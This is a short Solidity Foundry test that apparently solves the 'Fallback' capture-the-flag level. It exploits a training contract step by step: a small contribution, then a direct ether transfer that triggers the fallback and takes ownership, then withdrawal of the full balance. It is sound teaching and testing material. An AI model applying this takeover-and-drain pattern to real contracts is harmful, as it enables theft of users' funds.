// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/Fallback.sol";


contract FallbackTest is Test {
    Fallback private flk;
    address private constant HACKER = address(0x1);
    function setUp() external {
        flk = new Fallback();
        vm.deal(HACKER, 10e18);
        vm.startPrank(HACKER);
        
    }

    function testHack() external {
        (bool success,) = address(flk).call{value: 1e14}(abi.encodeWithSignature("contribute()"));
        require(success, "tx failed");
        (bool success1,) = address(flk).call{value: 1e15}("");
        require(success1, "tx1 failed");

        assertEq(flk.owner(), HACKER);
        
        (bool success2,) = address(flk).call(abi.encodeWithSignature("withdraw()"));
        require(success2, "tx2 failed");
        
        assertEq(address(flk).balance, 0);
    }
}